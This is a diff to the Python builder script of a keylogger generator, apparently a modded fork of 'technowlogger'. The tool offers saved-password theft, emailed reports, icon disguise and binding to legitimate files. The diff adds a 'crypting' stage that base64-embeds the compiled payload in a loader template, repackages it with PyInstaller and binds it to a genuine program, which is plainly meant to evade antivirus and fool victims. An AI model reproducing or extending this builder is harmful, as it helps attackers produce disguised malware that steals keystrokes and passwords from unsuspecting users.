@@ -10,7 +10,13 @@ from essential_generators import DocumentGenerator
 import platform
 from colorama import init
 from colorama import Fore, Back, Style
+import time
+from base64 import b64encode as b64e
+import msvcrt as m
+import random
 init()
+
+mainfold = os.getcwd()
 
 if platform.system() == 'Windows':
     AttackerPlatform = 'Windows'
@@ -27,11 +33,12 @@ def get_arguments():
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
     parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
-    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
+
     parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
     
     
     required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
+    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
     required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
@@ -273,7 +280,8 @@ if __name__ == '__main__':
         
     try:
         print(banners.get_banner())
-        print(f"\t\t{Fore.YELLOW}Author: {Fore.GREEN}Pushpender | {Fore.YELLOW}GitHub: {Fore.GREEN}@PushpenderIndia\n")
+        print(f"\t\t{Fore.YELLOW}Author: {Fore.GREEN}Pushpender | {Fore.YELLOW}GitHub: {Fore.GREEN}@PushpenderIndia")
+        print(f"\t\t{Fore.YELLOW}Modded by: {Fore.GREEN}httpshotmaker | {Fore.YELLOW}GitHub: {Fore.GREEN}@httpshotmaker\n")
 
         arguments = get_arguments()       
         
@@ -364,16 +372,39 @@ if __name__ == '__main__':
             print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")
 
             pack_exe_using_upx()
-            
-            print(f"\n\n{Fore.RED}[***] Don't forget to allow less secure applications in your Gmail account.")
-            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
-            print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")
+
+            print(f'{Fore.YELLOW}\n[*] Crypting the file')
+
+            class Main:
+                def main(self):
+
+                    filename = f'{os.getcwd()}\{arguments.out}.exe'
+                    with open(filename,"rb") as f:
+                        bdata = b64e(f.read()).decode()
+                    sing_file = arguments.bind
+                    iname = f'{mainfold}\{arguments.icon}'
+                    fname = f"{arguments.out}.py"
+                    with open(f"{mainfold}\loader_mask.py","r") as f:
+                        mask = f.read()
+                    with open(fname,"w") as f:
+                        f.write(mask.replace("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",bdata))
+                    print(f"{Fore.MAGENTA}")
+                    os.system(f"pyinstaller --onefile --clean {fname} {f'-i {iname}' if iname != '' else ''} > nul")
+                    finname = f"{arguments.out}.exe"
+                    os.system(f'cmd /c python st.py -t "{mainfold}\{fname.replace(".py",".exe")}" -i "{sing_file}" -o {finname} > nul')
+            Main().main()
+            print(f"{Fore.GREEN}\n[+] Crypted Successfully !")
+
+            print(f"\n\n{Fore.RED}[***] Attention! The usual password for your account will not work. Need a password for the app.")
+            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/security")
+            print(f"\n{Fore.RED} :O-) FIRST TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")
+            print(f"{Fore.RED} :O-) SECOND TIP{Fore.YELLOW} : USE LEGITIMATE FILES from {Fore.RED}bindto{Fore.YELLOW} folder like this >>  {Fore.RED}-b bindto/exe.exe")
 
         else:
             print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
-            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")                  
-    
-    except KeyboardInterrupt:        
+            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")
+
+    except KeyboardInterrupt:
         exit_greet()
         del_junk_file(arguments.out)
         
